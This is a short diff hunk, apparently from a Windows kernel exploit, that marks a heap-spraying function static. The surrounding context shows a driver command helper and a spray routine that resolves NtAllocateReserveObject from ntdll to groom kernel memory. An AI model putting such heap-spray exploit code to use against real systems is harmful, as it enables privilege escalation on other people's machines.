@@ -95,7 +95,7 @@ NTSTATUS Command(HANDLE deviceHandle, Commands operate) {
 		);
 }
 
-NTSTATUS SprayHeap() {
+static NTSTATUS SprayHeap() {
 	const DWORD hArrSize = 8000 + 5000;
 	auto NtAllocateReserveObject = (NtAllocateReserveObject_t)GetProcAddress(GetModuleHandle(L"ntdll.dll"),
 																				"NtAllocateReserveObject");
